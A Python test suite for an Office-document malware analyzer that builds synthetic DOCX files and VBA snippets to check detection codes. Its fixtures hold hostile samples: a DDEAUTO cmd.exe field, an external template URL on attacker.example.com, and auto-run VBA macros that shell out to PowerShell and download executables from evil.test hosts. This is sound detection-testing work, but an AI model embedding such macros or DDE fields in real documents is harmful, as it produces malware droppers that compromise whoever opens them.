"""OfficeAnalyzer integration tests.

Fixtures are *generated* in-process (no malware-corpus files committed):
    * Synthetic OOXML zips assembled with stdlib `zipfile` to exercise
      OOXML.* code paths (clean, DDEAUTO, external template, embedded PE,
      remote image rel).
    * VBA pipeline tested by feeding synthetic VBA source straight into
      `_inspect_vba_module`.
    * RTF tested by feeding hand-rolled control-word strings into
      `_analyze_rtf_data` (does not require real OLE bytes for class-name
      detection by rtfobj).
"""

from pathlib import Path
import io
import zipfile

import pytest


# ---------------------------------------------------------------------------
# Office analyzer fixture
# ---------------------------------------------------------------------------
@pytest.fixture()
def office_analyzer():
    pytest.importorskip("oletools")
    from tools.custom.office_analyzer import OfficeAnalyzer
    return OfficeAnalyzer()


def _codes(result):
    return {f.get("code") for f in result["findings"] if f.get("code")}


# ---------------------------------------------------------------------------
# OOXML fixture builders
# ---------------------------------------------------------------------------
_CONTENT_TYPES_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '</Types>'
)

_DOC_RELS_BASE = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
    'Target="word/document.xml"/>'
    '</Relationships>'
)

_MIN_DOC_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:body><w:p><w:r><w:t>hello</w:t></w:r></w:p></w:body>'
    '</w:document>'
)


def _make_docx(tmp_path: Path, name: str, parts: dict) -> Path:
    """Build a minimal docx zip; `parts` overrides/extends the base parts."""
    base = {
        "[Content_Types].xml": _CONTENT_TYPES_XML,
        "_rels/.rels": _DOC_RELS_BASE,
        "word/document.xml": _MIN_DOC_XML,
    }
    base.update(parts)
    p = tmp_path / name
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as zf:
        for arcname, data in base.items():
            if isinstance(data, str):
                data = data.encode("utf-8")
            zf.writestr(arcname, data)
    return p


# ---------------------------------------------------------------------------
# Tests: OOXML
# ---------------------------------------------------------------------------
def test_clean_docx_is_clean(office_analyzer, tmp_path):
    p = _make_docx(tmp_path, "clean.docx", {})
    result = office_analyzer.analyze(p)
    assert result["verdict"] == "clean"
    # No OOXML.EXTERNAL / DDE / EMBEDDED codes
    bad = {c for c in _codes(result) if c.startswith("OFFICE.")
           and c not in ("OFFICE.CLEAN", "OFFICE.VBA_PRESENT")}
    assert not bad, f"unexpected codes on clean docx: {bad}"


def test_ddeauto_docx_fires(office_analyzer, tmp_path):
    dde_doc = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        '<w:body><w:p>'
        '<w:r><w:fldChar w:fldCharType="begin"/></w:r>'
        '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe '
        '"/c calc.exe" </w:instrText></w:r>'
        '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
        '</w:p></w:body>'
        '</w:document>'
    )
    p = _make_docx(tmp_path, "dde.docx", {"word/document.xml": dde_doc})
    result = office_analyzer.analyze(p)
    codes = _codes(result)
    assert "OFFICE.DDEAUTO" in codes
    assert "OFFICE.AUTOEXEC" in codes
    assert result["verdict"] == "malicious"


def test_external_template_docx_fires(office_analyzer, tmp_path):
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://attacker.example.com/payload.dotm" '
        'TargetMode="External"/>'
        '</Relationships>'
    )
    p = _make_docx(tmp_path, "ext_template.docx",
                   {"word/_rels/document.xml.rels": rels})
    result = office_analyzer.analyze(p)
    codes = _codes(result)
    assert "OFFICE.EXTERNAL_TEMPLATE" in codes
    assert "OFFICE.EXTERNAL_HTTP" in codes
    assert result["verdict"] == "malicious"
    # IOC URL surfaced
    urls = result.get("iocs", {}).get("urls", [])
    assert any("attacker.example.com" in u for u in urls)


def test_embedded_pe_in_docx_fires(office_analyzer, tmp_path):
    pe_blob = b"MZ" + b"\x90" * 256 + b"PE\x00\x00" + b"\x00" * 256
    p = _make_docx(tmp_path, "embedded_pe.docx", {
        "word/embeddings/oleObject1.bin": pe_blob,
    })
    result = office_analyzer.analyze(p)
    codes = _codes(result)
    assert "OFFICE.EMBEDDED_OLE_PE" in codes
    assert result["verdict"] == "malicious"
    # Hash surfaced as IOC
    findings = [f for f in result["findings"]
                if f.get("code") == "OFFICE.EMBEDDED_OLE_PE"]
    assert any(f.get("iocs", {}).get("hashes_sha256") for f in findings)


def test_remote_image_rel_fires(office_analyzer, tmp_path):
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId2" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
        'Target="http://tracking.example.com/pixel.png" '
        'TargetMode="External"/>'
        '</Relationships>'
    )
    p = _make_docx(tmp_path, "remote_img.docx",
                   {"word/_rels/document.xml.rels": rels})
    result = office_analyzer.analyze(p)
    assert "OFFICE.EXTERNAL_REMOTE_IMG" in _codes(result)
    assert result["verdict"] in ("suspicious", "malicious", "clean")  # base score 10


def test_bad_zip_emits_malformed(office_analyzer, tmp_path):
    p = tmp_path / "fake.docx"
    p.write_bytes(b"PK\x03\x04not-actually-a-zip-payload")
    result = office_analyzer.analyze(p)
    # Either parsed as bad zip, or VBA_Parser flagged it either way, not clean
    assert "OFFICE.MALFORMED" in _codes(result) or result["verdict"] != "clean"


# ---------------------------------------------------------------------------
# Tests: VBA pipeline (call _inspect_vba_module directly with synthetic source)
# ---------------------------------------------------------------------------
def test_vba_autoopen_shell_url_fires(office_analyzer):
    vba_src = (
        'Sub AutoOpen()\n'
        '    Dim x As String\n'
        '    x = "http://evil.example.com/payload.exe"\n'
        '    Shell "cmd.exe /c powershell.exe -enc " & x, vbHide\n'
        'End Sub\n'
    )
    result = {"file": "x", "type": "Office Document", "timestamp": "",
              "findings": [], "tools_used": [], "iocs": {}, "statistics": {}}
    seen = set()
    buckets = []
    office_analyzer._inspect_vba_module(
        vba_src, "VBA/Module1", "Module1", result, seen, buckets,
    )
    codes = _codes(result)
    assert "OFFICE.VBA_AUTOEXEC" in codes
    assert "OFFICE.VBA_SHELL" in codes
    assert "OFFICE.VBA_IOC_URL" in codes
    # Score this finding bag should land malicious
    score, verdict, _ = office_analyzer.scorer.score(result["findings"])
    assert verdict == "malicious"


def test_vba_obfuscated_chr_fires(office_analyzer):
    chr_calls = " & ".join(f"Chr({ord(c)})" for c in "PowerShellPayloadString")
    vba_src = (
        'Sub Document_Open()\n'
        f'    Dim x: x = {chr_calls}\n'
        '    MsgBox x\n'
        'End Sub\n'
    )
    result = {"file": "x", "type": "Office Document", "timestamp": "",
              "findings": [], "tools_used": [], "iocs": {}, "statistics": {}}
    office_analyzer._inspect_vba_module(
        vba_src, "VBA/Module1", "Module1", result, set(), [],
    )
    codes = _codes(result)
    assert "OFFICE.VBA_OBFUSCATED" in codes
    assert "OFFICE.VBA_AUTOEXEC" in codes  # Document_Open


def test_vba_collects_all_hits_no_break(office_analyzer):
    """Repro of the historical bug: many suspicious hits, all should surface."""
    vba_src = (
        'Sub Workbook_Open()\n'
        '    Shell("cmd.exe")\n'
        '    Dim o: Set o = CreateObject("WScript.Shell")\n'
        '    o.Run "powershell.exe -enc Zm9v"\n'
        '    Dim h: Set h = CreateObject("MSXML2.XMLHTTP")\n'
        '    h.Open "GET", "http://evil.test/p", False\n'
        '    URLDownloadToFile 0, "http://evil.test/x.exe", "x.exe", 0, 0\n'
        'End Sub\n'
    )
    result = {"file": "x", "type": "Office Document", "timestamp": "",
              "findings": [], "tools_used": [], "iocs": {}, "statistics": {}}
    office_analyzer._inspect_vba_module(
        vba_src, "VBA/Module1", "Module1", result, set(), [],
    )
    codes = _codes(result)
    # Multiple categories must all surface not just the first.
    assert "OFFICE.VBA_AUTOEXEC" in codes
    assert "OFFICE.VBA_SHELL" in codes
    assert "OFFICE.VBA_DOWNLOAD" in codes
    assert "OFFICE.VBA_IOC_URL" in codes


# ---------------------------------------------------------------------------
# Tests: misc
# ---------------------------------------------------------------------------
def test_password_candidate_extraction():
    from tools.custom.office_analyzer import OfficeAnalyzer
    body = "FYI the password is hunter2 open the attached invoice."
    candidates = OfficeAnalyzer._password_candidates_from_body(body)
    assert "hunter2" in candidates


def test_score_engine_correlations_for_office(office_analyzer):
    findings = [
        {"code": "OFFICE.VBA_AUTOEXEC"},
        {"code": "OFFICE.VBA_SHELL"},
    ]
    score, verdict, summary = office_analyzer.scorer.score(findings)
    assert verdict == "malicious"
    assert "shell" in summary.lower() or "auto" in summary.lower()


def test_dde_plus_autoexec_correlation(office_analyzer):
    findings = [
        {"code": "OFFICE.DDE"},
        {"code": "OFFICE.AUTOEXEC"},
    ]
    score, verdict, _ = office_analyzer.scorer.score(findings)
    assert verdict in ("suspicious", "malicious")


def test_external_template_alone_is_malicious(office_analyzer):
    # CVE-2017-0199 family template injection alone is bad enough
    findings = [{"code": "OFFICE.EXTERNAL_TEMPLATE"},
                {"code": "OFFICE.EXTERNAL_HTTP"}]
    score, verdict, _ = office_analyzer.scorer.score(findings)
    assert verdict == "malicious"
